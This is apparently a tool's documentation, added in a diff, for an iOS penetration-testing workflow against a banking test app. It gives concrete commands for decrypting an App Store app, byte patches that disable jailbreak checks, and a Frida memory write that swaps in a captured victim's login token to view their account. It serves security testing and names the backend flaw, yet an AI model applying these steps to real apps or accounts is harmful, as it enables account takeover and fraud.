@@ -1,0 +1,287 @@
+# iOS workflow — decrypt → patch → re-sign → run → memory-swap
+
+The Android pipeline is mostly automatic (apktool decodes, jadx
+decompiles, mobsf opines). iOS is harder because App Store IPAs ship
+FairPlay-encrypted — the kernel decrypts in RAM at load time, so
+"give me a readable binary" is itself a step.
+
+This document covers the end-to-end iOS pentest workflow MedusaNexus
+supports, in the order an analyst runs it.
+
+For the runtime side (Frida session lifecycle, recipe stacking,
+Memory Inspector) see [`RUNTIME.md`](RUNTIME.md).
+
+---
+
+## Prerequisites
+
+| Tool | Why | Install |
+|---|---|---|
+| Jailbroken iOS device | FairPlay decryption needs kernel access | `palera1n` (A11+), `unc0ver`, `checkra1n` (A11-) |
+| `frida-server` on the device | Required for spawn/attach + memory ops | Install from the Frida website, run on boot |
+| `bagbak` (preferred) **or** `frida-ios-dump` | Decryption wrapper | `npm install -g bagbak` **or** `git clone https://github.com/AloneMonkey/frida-ios-dump ~/.mnexus/tools/frida-ios-dump && (cd $_ && pip install -r requirements.txt)` |
+| `ldid` (preferred) **or** `codesign` | Re-sign patched IPA | `brew install ldid` on macOS; `codesign` ships with Xcode |
+| `apktool` / `apksigner` | Only for the Android side — not used by iOS flow | — |
+
+Check what's wired:
+
+```bash
+mnexus doctor
+# Should show: vphone (if you're using super-tart-vphone) + frida row OK
+curl -s http://localhost:8765/v1/ios/decrypt/status
+# {"available":true,"tool":"bagbak","path":"/usr/local/bin/bagbak"}
+```
+
+---
+
+## Step 1 — Decrypt the IPA off a JB device
+
+Use the REPL:
+
+```
+mnexus> /decrypt-ios com.target.bank.test
+[cyan]decrypting com.target.bank.test…[/cyan] (this can take 30–180s)
+[green]✓ decrypted via bagbak[/green] · 42850ms
+  /Users/you/.mnexus/workspace/decrypted-ipas/com.target.bank.test.ipa
+  → ingested as PRJ-3F8B2A91
+```
+
+…or hit the endpoint directly:
+
+```http
+POST /v1/ios/decrypt
+Content-Type: application/x-www-form-urlencoded
+
+bundle_id=com.target.bank.test&device_id=&ingest=true&timeout_s=180
+```
+
+| Field | Default | Notes |
+|---|---|---|
+| `bundle_id` | required | The app's CFBundleIdentifier. Pull from `Settings → General → iPhone Storage → <app>` on the device. |
+| `device_id` | _first USB_ | Forwarded to `bagbak -d` when set. `frida-ios-dump` ignores it. |
+| `ingest` | `true` | Auto-feed the decrypted IPA into the iOS ingest pipeline so it shows up under `/v1/projects`. |
+| `timeout_s` | `180` | Subprocess budget. Big apps (1+ GB IPA) may need 600+. |
+
+Returns:
+
+```json
+{
+  "tool": "bagbak",
+  "bundle_id": "com.target.bank.test",
+  "ipa_path": "/Users/.../com.target.bank.test.ipa",
+  "log": "…",
+  "duration_ms": 42850,
+  "warnings": [],
+  "project_id": "PRJ-3F8B2A91",
+  "package": "com.target.bank.test",
+  "version": "1.2.3"
+}
+```
+
+**Failure codes** match the meaning so the UI / REPL can branch:
+
+| Code | Meaning |
+|---|---|
+| 503 | No decryptor on PATH. `install_hint` field tells you which. |
+| 504 | Subprocess hit `timeout_s`. Re-run with a higher budget. |
+| 500 | Tool exited but produced no IPA — log tail in `detail`. |
+
+---
+
+## Step 2 — Static analysis on the decrypted IPA
+
+Same screens as Android: `/#/project/<id>/overview` → `/static` →
+`/native`. The key one for the JB-bypass workflow is **NATIVE**:
+
+```
+http://localhost:8765/#/project/PRJ-3F8B2A91/native
+```
+
+Then click on `Payload/<App>.app/<Executable>` → calls
+`GET /v1/projects/{id}/native/analyze?lib=<path>`. Returns:
+
+```json
+{
+  "format": "macho",
+  "name": "Bank",
+  "size": 23947216,
+  "findings": [...],            // anti-Frida / pinning / jailbreak detection
+  "jni_exports": [],             // empty for Mach-O; only ELF has JNI
+  "hardcoded_urls": [...],
+  "hardcoded_keys": [...],
+  "crypto_operations": [...]
+}
+```
+
+The `findings` list flags everything the engine pattern-matched:
+
+- `Anti-Frida tripwire` — `frida|gum-js` strings in binary
+- `Anti-debug — ptrace(PT_DENY_ATTACH)`
+- `Jailbreak path probe — /Applications/Cydia.app, …`
+- `Crypto library — OpenSSL/BoringSSL/CommonCrypto`
+
+The findings tell you WHAT to bypass; you still need a disassembler
+(Hopper, Ghidra, IDA) to find the FILE OFFSET of each check function
+before patching.
+
+---
+
+## Step 3 — Patch the JB check
+
+Open the Mach-O in Hopper / Ghidra. Find the function that returns
+the JB verdict — usually called something like `_isJailbroken`,
+`-[BankSecurity isCompromised]`, `-[RootCheck check]`. Read off the
+**file offset** (Ghidra's Offset column, not the virtual address).
+
+```
+mnexus> /patch ipa return_zero_at_offset:0x100123456
+```
+
+Or via API:
+
+```http
+POST /v1/projects/PRJ-3F8B2A91/ios/patch
+Content-Type: application/json
+
+{
+  "patches": [
+    {"name": "return_zero_at_offset", "offset": "0x100123456"}
+  ]
+}
+```
+
+Two patches supported:
+
+| Patch | Bytes written | Purpose |
+|---|---|---|
+| `return_zero_at_offset` | `00 00 80 d2  c0 03 5f d6` (8 bytes: `mov x0, #0; ret`) | Make the function return `false`. Canonical "disable jailbreak check". |
+| `nop_at_offset` | `1f 20 03 d5` × N (4 bytes per NOP) | Wipe a call site without altering surrounding control flow. |
+
+Response carries the rollback artefact:
+
+```json
+{
+  "project_id": "PRJ-3F8B2A91",
+  "ipa_path":     "/Users/.../com.target.bank.test.ipa",
+  "patched_path": "/Users/.../com.target.bank.test-patched.ipa",
+  "patches_applied": [
+    {"name": "return_zero_at_offset", "offset": "0x100123456",
+     "ok": true, "bytes_written": 8, "previous_hex": "f8 5f 40 a9 fd 7b c1 a8"}
+  ],
+  "patches_skipped": [],
+  "warnings": [],
+  "signing_tool": "ldid"
+}
+```
+
+`previous_hex` is the rollback: save it. If the patch breaks
+something else downstream, you can `/patch ipa nop_at_offset:0x100123456:2`
+to write NOPs over your patch, or write the original bytes back.
+
+### Re-signing fallbacks
+
+The patcher tries:
+1. `ldid -S <Mach-O>` — preferred for JB devices, no Apple cert needed
+2. `codesign --force --sign - <Mach-O>` — Apple's ad-hoc signature
+3. Neither available → IPA ships unsigned with a warning
+
+For non-JB devices you'll need to re-sign with a real Apple Developer
+cert. The patched IPA is a plain zip; resign with your own toolchain
+or `iresign`/`fastlane sigh`.
+
+---
+
+## Step 4 — Install + run the patched IPA
+
+The patched IPA lives at `~/.mnexus/workspace/patched-ipas/<App>-patched.ipa`.
+Install via:
+
+```bash
+# JB device, via SSH:
+scp out.ipa root@iphone:/var/root/
+ssh root@iphone "appinst /var/root/out.ipa"
+
+# Non-JB device, via Sideloadly / AltStore:
+# (drag the .ipa onto Sideloadly, sign with your Apple ID)
+
+# Or via ideviceinstaller (libimobiledevice):
+ideviceinstaller -i out.ipa
+```
+
+Open the app. If the JB check fires again **later** (e.g. after
+login), find that function's offset and patch it too. Real banks
+have 3-5 checks at different lifecycle stages. Iterate.
+
+---
+
+## Step 5 — Token-swap via Memory Inspector
+
+The talk's marquee move: after logging in with your own account,
+capture the victim's JWT via Moxy (the proxy will surface a `JWT
+visible in MITM response` finding automatically), then overwrite
+your in-memory token with theirs.
+
+```
+mnexus> /dynamic start --recipes ios_ssl_kill_switch
+[green]✓ attached[/green] · session a4b8c2 · pid 1234 · tooling on
+
+# (use the app, get the proxy to capture the victim's token)
+
+mnexus> /memory modules
+  Bank                            0x100000000  +25165824B
+  Foundation                      0x180000000  +50331648B
+  …
+
+mnexus> /memory scan "65 79 4a 68" --module Bank
+1 hit(s) · scanned 18 range(s)
+  0x10f234000  rw-  0x10f200000+1048576B
+
+mnexus> /memory read 0x10f234000 256
+0x10f234000 · 256B
+  65 79 4a 68 62 47 63 69 4f 69 4a 49 55 7a 49 31  eyJhbGciOiJIUzI1
+  4e 69 49 73 49 6e 52 35 63 43 49 36 49 6b 70 58  NiIsInR5cCI6IkpX
+  …
+
+mnexus> /memory write 0x10f234000 "65 79 4a 68 62 47 63 69 …"  # victim's JWT
+[yellow]overwrite 256 byte(s) at 0x10f234000? this can crash the target[/yellow] [y/N]: y
+[green]✓ wrote 256 byte(s)[/green] at 0x10f234000
+  rollback: 65 79 4a 68 62 47 63 69 4f 69 4a 49 55 7a 49 31 …
+```
+
+From here, any request the app builds reads the heap, picks up the
+victim's JWT, sends it. Backend validates against its own signing
+key and replies with the victim's data. The UI shows the victim's
+account.
+
+**The vulnerability isn't client-side** — it's the backend trusting
+the JWT without device-binding or `aud` audience pinning. Client
+hardening (cert pinning, JB detection) buys time, not security.
+
+---
+
+## REPL command quick reference
+
+| Command | Counterpart |
+|---|---|
+| `/decrypt-ios <bundle_id>` | `POST /v1/ios/decrypt` |
+| `/patch ipa <name>:<offset>[:<count>] …` | `POST /v1/projects/{id}/ios/patch` |
+| `/dynamic start --recipes ios_ssl_kill_switch` | `POST /v1/projects/{id}/dynamic/start` |
+| `/memory scan|read|write|modules` | `/v1/dynamic/sessions/{sid}/memory/*` |
+| `/diff manifest|findings` | `/v1/projects/{id}/manifest-diff` / `/findings-diff` |
+
+---
+
+## What's NOT implemented yet
+
+- **Virtual address → file offset translation.** You give the patcher
+  the file offset (Ghidra's Offset column) directly. RVA support
+  would require parsing Mach-O LC_SEGMENT_64 load commands. Tracked
+  for a follow-up.
+- **dylib injection** (`LC_LOAD_DYLIB` insertion for FridaGadget).
+  Useful for non-JB analysis; requires `optool` or `insert_dylib`.
+  Tracked for a follow-up.
+- **`MemoryAccessMonitor`** for trace-on-read/write. The Memory
+  Inspector ships scan / read / write but not the watchpoint feature.
+- **Setup script for iOS tools** (`scripts/setup.sh --ios-tools`)
+  to install bagbak + ldid + clone frida-ios-dump in one shot.
+  Currently each is a manual `npm` / `brew` / `git clone`.
